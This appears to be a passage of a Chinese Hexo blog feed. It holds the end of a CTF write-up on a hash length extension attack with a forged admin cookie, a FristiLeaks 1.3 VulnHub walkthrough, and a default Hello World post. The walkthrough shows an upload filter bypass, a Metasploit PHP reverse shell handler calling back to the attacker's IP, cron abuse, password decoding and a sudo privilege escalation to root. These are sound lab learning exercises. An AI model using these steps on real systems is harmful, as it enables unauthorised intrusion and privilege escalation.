md5($salt.strrev($s));</div><div class="line">            setcookie(&apos;hsh&apos;,$hsh);</div><div class="line">        &#125;</div><div class="line">        if ($auth) &#123;</div><div class="line">            echo &quot;&lt;h3&gt;Welcome Admin. Your flag is</div><div class="line">        &#125; else &#123;</div><div class="line">            echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;</div><div class="line">        &#125;</div><div class="line">    ?&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p>这里反序列化在php版本低的时候可以使用%00截断 ，所以反序之后原本添加在后的admin成为首部，之后的部分被00截断</p><p>这里知道原数据：;”tseug”:5:s  ；原hash值：3a4727d57463f122833d9e732f94e4e0；但salt长度未知需要爆破</p><p>需要添加的内容：;”nimda”:5:s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali:~# hashpump</div><div class="line">Input Signature: 3a4727d57463f122833d9e732f94e4e0</div><div class="line">Input Data: ;&quot;tseug&quot;:5:s</div><div class="line">Input Key Length: 11</div><div class="line">Input Data to Add: ;&quot;nimda&quot;:5:s</div><div class="line">fcdc3840332555511c4e4323f6decb07</div><div class="line">;&quot;tseug&quot;:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00;&quot;nimda&quot;:5:s</div></pre></td></tr></table></figure><p>还需要反序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">role = s%3a5%3a&quot;admin&quot;%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a&quot;guest&quot;%3b</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在密码学和计算机安全中，&lt;strong&gt;长度扩展攻击（Length extension attacks）&lt;/strong&gt;是指针对某些允许包含额外信息的加密散列函数的攻击手段。 该攻击适用于在&lt;em&gt;消息&lt;/em&gt;与&lt;em&gt;密钥&lt;/em&gt;的长度已知的情形下，所有采取了 &lt;s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>FristiLeaks 1.3 VulnHub Writeup</title>
    <link href="http://yoursite.com/2018/02/19/Fristileaks%201.3/"/>
    <id>http://yoursite.com/2018/02/19/Fristileaks 1.3/</id>
    <published>2018-02-19T08:51:32.662Z</published>
    <updated>2018-08-14T10:52:53.362Z</updated>
    
    <content type="html"><![CDATA[<p>Description:</p><blockquote><p>A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..</p></blockquote><p>NOTE:设置是需要把虚拟机的mac地址改为08:00:27:A5:A6:76<br>虚拟机打开是这个样子<br><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/mFFBjgg7HC.png?imageslim" alt="mark"><br>目标是成为root用户并拿到flag</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先是寻找目标机</p><blockquote><p>nmap -sn 192.168.224。</p></blockquote><pre><code>root@kali:~# nmap -sn 192.168.224.0/24Starting Nmap 7.40 ( https://nmap.org ) Nmap scan report for 192.168.224.1Host is up (0.00024s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.224.2Host is up (0.00016s latency).MAC Address: 00:50:56:FD:70:F2 (VMware)Nmap scan report for 192.168.224.135Host is up (0.00016s latency).MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.224.254Host is up (0.00015s latency).MAC Address: 00:50:56:FB:7A:70 (VMware)Nmap scan report for 192.168.224.136Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 1.71 seconds</code></pre><p>发现目标主机在192.168.224.135，对目标主机进行扫描</p><blockquote><p>nmap -sS -sV -T4 -A -O 192.168.224.135</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Starting Nmap 7.40 ( https://nmap.org )</div><div class="line">Nmap scan report for 192.168.224.135</div><div class="line">Host is up (0.0016s latency).</div><div class="line">Not shown: 999 filtered ports</div><div class="line">PORT   STATE SERVICE VERSION</div><div class="line">80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</div><div class="line">| http-methods: </div><div class="line">|_  Potentially risky methods: TRACE</div><div class="line">| http-robots.txt: 3 disallowed entries </div><div class="line">|_/cola /sisi /beer</div><div class="line">|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</div><div class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</div><div class="line">MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</div><div class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</div><div class="line">Device type: general purpose</div><div class="line">Running: Linux 2.6.X|3.X</div><div class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</div><div class="line">OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</div><div class="line">Network Distance: 1 hop</div></pre></td></tr></table></figure><p>得到的信息是80端口开启，并且是Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)，还有robots.txt</p><h1 id="查找突破点"><a href="#查找突破点" class="headerlink" title="查找突破点"></a>查找突破点</h1><p>首先浏览web网站</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/KFh2dicie1.png?imageslim" alt="mark"></p><p>查看robots.txt,进入给出的三个目录，但只得到一张相同的图片</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/K3kECKKDH8.jpg?imageslim" alt="mark"></p><p>似乎并没有什么用，但是注意到这三个名字都为饮品，而结合首页的keep calm and drink fristi,尝试/fristi</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/24mCmfG7Ge.png?imageslim" alt="mark"></p><p>成功得到一个登陆页面! :)查看源代码</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/dLaelc8C43.png?imageslim" alt="mark"></p><p>看到一段注释，是eezeepz留下的，而之后出现的图片被base64编码，而在后面有一段注释的代码，同样试试base64，解出来是一张似乎是密码的图片</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/H7JB9lH4D7.png?imageslim" alt="mark"></p><p>使用eezeepz作为username成功登陆</p><p>可以上传文件了</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/hc1C3hm4aI.png?imageslim" alt="mark"></p><p>不过进行了简单的过滤，只能上传png,jpg,gif,修改后缀名就能绕过</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>添加.jpg后缀，上传反向shell,设置监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</div><div class="line">payload =&gt; php/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lhost 192.168.224.136</div><div class="line">lhost =&gt; 192.168.224.136</div><div class="line">msf exploit(handler) &gt; set lport 445</div><div class="line">lport =&gt; 445</div><div class="line">msf exploit(handler) &gt; run</div><div class="line">[*] Started reverse TCP handler on 192.168.224.136:445 </div><div class="line">[*] Starting the payload handler...</div><div class="line">[*] Sending stage (33986 bytes) to 192.168.224.135</div><div class="line">[*] Meterpreter session 1 opened (192.168.224.136:445 -&gt; 192.168.224.135:57657) at 2018-02-14 17:34:28 +0800</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; shell</div><div class="line">Process 5305 created.</div><div class="line">Channel 0 created.</div><div class="line">id</div><div class="line">uid=48(apache) gid=48(apache) groups=48(apache)</div><div class="line">pwd</div><div class="line">/var/www/html/fristi/uploads</div></pre></td></tr></table></figure><p>文件比较多，一级一级查看，在/var/www 中发现有一个notes.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat notes.txt</div><div class="line">hey eezeepz your homedir is a mess, go clean it up, just dont delete</div><div class="line">the important stuff.</div><div class="line"></div><div class="line">-jerry</div></pre></td></tr></table></figure><p>于是去查看home目录中的eezeepz,在里面同样发现了一个notes.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">cat notes.txt</div><div class="line">Yo EZ,</div><div class="line"></div><div class="line">I made it possible for you to do some automated checks, </div><div class="line">but I did only allow you access to /usr/bin/* system binaries. I did</div><div class="line">however copy a few extra often needed commands to my </div><div class="line">homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those</div><div class="line">from /home/admin/</div><div class="line"></div><div class="line">Don&apos;t forget to specify the full path for each binary!</div><div class="line"></div><div class="line">Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The </div><div class="line">output goes to the file &quot;cronresult&quot; in /tmp/. It should </div><div class="line">run every minute with my account privileges.</div><div class="line"></div><div class="line">- Jerry</div></pre></td></tr></table></figure><p>提示可以使用chmod, df, cat, echo, ps, grep, egrep 命令，并要在/tmp/创建runthis文件，之后会出现cronresult文件，并用他的权限执行</p><p>想要去查看admin的内容可以利用chmod 修改权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">echo &quot;/home/admin/chmod 777 /home/admin&quot; &gt; /tmp/runthis</div><div class="line">ls</div><div class="line">cronresult</div><div class="line">runthis</div><div class="line">cat cronresult </div><div class="line">executing: /home/admin/chmod 777 /home/admin</div><div class="line">executing: /home/admin/chmod 777 /home/admin</div><div class="line">executing: /home/admin/chmod 777 /home/admin</div><div class="line">executing: /home/admin/chmod 777 /home/admin</div></pre></td></tr></table></figure><p>可以进入admin了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">cd admin</div><div class="line">ls</div><div class="line">cat</div><div class="line">chmod</div><div class="line">cronjob.py</div><div class="line">cryptedpass.txt</div><div class="line">cryptpass.py</div><div class="line">df</div><div class="line">echo</div><div class="line">egrep</div><div class="line">grep</div><div class="line">ps</div><div class="line">whoisyourgodnow.txt</div></pre></td></tr></table></figure><p>cryptedpass.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mVGZ3O3omkJLmy2pcuTq</div></pre></td></tr></table></figure><p>cryptpass.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</div><div class="line">import base64,codecs,sys</div><div class="line"></div><div class="line">def encodeString(str):</div><div class="line">    base64string= base64.b64encode(str)</div><div class="line">    return codecs.encode(base64string[::-1], &apos;rot13&apos;)</div><div class="line"></div><div class="line">cryptoResult=encodeString(sys.argv[1])</div><div class="line">print cryptoResult</div></pre></td></tr></table></figure><p>whoisyourgodnow.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=RFn0AKnlMHMPIzpyuTI0ITG</div></pre></td></tr></table></figure><p>看来密码是经过一个加密，新base64加密，再用倒序的字符串进行rot13加密</p><p>解密分别得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">thisisalsopw123</div><div class="line">LetThereBeFristi!</div></pre></td></tr></table></figure><p>这可能是另一个用户fristigod 的密码</p><p>这里采用su - 切换是出现了问题，提示standard in must be a tty<br>查找资料可以用python模拟一个虚拟终端解决  <strong>python -c ‘import pty;pty.spawn(“/bin/sh”)’</strong><br>原因是因为su(还有sudo)命令不是一个简单的进程，出于安全的考虑，linux要求用户必须从<strong>终端设备</strong>（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/sh&quot;)&apos;</div><div class="line">sh-4.1$ su - fristigod</div><div class="line">su - fristigod</div><div class="line">Password: LetThereBeFristi!</div></pre></td></tr></table></figure><p>成功进入fristigod账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ pwd</div><div class="line">pwd</div><div class="line">/var/fristigod</div><div class="line">-bash-4.1$ id</div><div class="line">id</div><div class="line">uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)</div><div class="line">-bash-4.1$ ls </div><div class="line">ls</div></pre></td></tr></table></figure><p>不过也不是root，并且没有东西，-al 试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ ls -al</div><div class="line">ls -al</div><div class="line">total 16</div><div class="line">drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .</div><div class="line">drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..</div><div class="line">-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history</div><div class="line">drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ cd .se</div><div class="line">cd .-bash-4.1$ ls -al</div><div class="line">ls -al</div><div class="line">total 16</div><div class="line">drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 .</div><div class="line">drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..</div><div class="line">-rwsr-sr-x  1 root      root      7529 Nov 25  2015 doCom</div></pre></td></tr></table></figure><p>doCom没有权限，查看历史命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ cat .bash_history</div><div class="line">cat .bash_history</div><div class="line">ls</div><div class="line">pwd</div><div class="line">ls -lah</div><div class="line">cd .secret_admin_stuff/</div><div class="line">ls</div><div class="line">./doCom </div><div class="line">./doCom test</div><div class="line">sudo ls</div><div class="line">exit</div><div class="line">cd .secret_admin_stuff/</div><div class="line">ls</div><div class="line">./doCom </div><div class="line">sudo -u fristi ./doCom ls /</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">sudo /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">groups</div><div class="line">ls -lah</div><div class="line">usermod -G fristigod fristi</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">less /var/log/secure e</div><div class="line">Fexit</div><div class="line">exit</div><div class="line">exit</div></pre></td></tr></table></figure><p>可见fristigod 大多使用sudo命令，同样试试sudo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ sudo -l</div><div class="line">sudo -l</div><div class="line">[sudo] password for fristigod: LetThereBeFristi!</div><div class="line"></div><div class="line">Matching Defaults entries for fristigod on this host:</div><div class="line">    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS</div><div class="line">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1</div><div class="line">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE</div><div class="line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY</div><div class="line">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL</div><div class="line">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,</div><div class="line">    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</div><div class="line"></div><div class="line">User fristigod may run the following commands on this host:</div><div class="line">    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom</div></pre></td></tr></table></figure><p>根据提示，尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">Usage: ./program_name terminal_command ...-bash-4.1$</div></pre></td></tr></table></figure><p>创建shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</div><div class="line">bash-4.1# id</div><div class="line">id</div><div class="line">uid=0(root) gid=100(users) groups=100(users),502(fristigod)</div><div class="line">bash-4.1# cd /root</div><div class="line">cd /root</div><div class="line">bash-4.1# ls</div><div class="line">ls</div><div class="line">fristileaks_secrets.txt</div><div class="line">bash-4.1# cat fri</div><div class="line">cat fristileaks_secrets.txt </div><div class="line">Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]</div><div class="line"></div><div class="line">I wonder if you beat it in the maximum 4 hours it&apos;s supposed to take!</div><div class="line"></div><div class="line">Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)</div><div class="line"></div><div class="line"></div><div class="line">Flag: Y0u_kn0w_y0u_l0ve_fr1st1</div></pre></td></tr></table></figure><p>得到flag，完成</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于Linux中tty、pty、pts</p><blockquote><p>1&gt; tty(终端设备的统称):<br>tty一词源于Teletypes，或teletypewriters，原来指的是电传打字机，是通过串行线用打印机键盘通过阅读和发送信息的东西，后来这东西被键盘和显示器取代，所以现在叫终端比较合适。<br>终端是一种字符型设备，他有多种类型，通常使用tty来简称各种类型的终端设备。<br>> pty（虚拟终端):<br>但是假如我们远程telnet到主机或使用xterm时不也需要一个终端交互么？是的，这就是虚拟终端pty(pseudo-tty)<br>> pts/ptmx(pts/ptmx结合使用，进而实现pty):<br>  s(pseudo-terminal slave)是pty的实现方法，和ptmx(pseudo-terminal master)配合使用实现pty。</p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.sina.com.cn/s/blog_638ac15c01012e0v.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_638ac15c01012e0v.html</a></p><p><a href="https://g0blin.co.uk/fristileaks-1-3-vulnhub-writeup/#-cola-sisi-and-beer" target="_blank" rel="external">https://g0blin.co.uk/fristileaks-1-3-vulnhub-writeup/#-cola-sisi-and-beer</a></p><p><a href="https://www.vulnhub.com/entry/fristileaks-13,133/" target="_blank" rel="external">来源</a></p><p>结束:)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Description:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/10/12/hello-world/"/>
    <id>http://yoursite.com/2017/10/12/hello-world/</id>
    <published>2017-10-12T14:25:21.255Z</published>
    <updated>2017-10-12T14:25:21.255Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
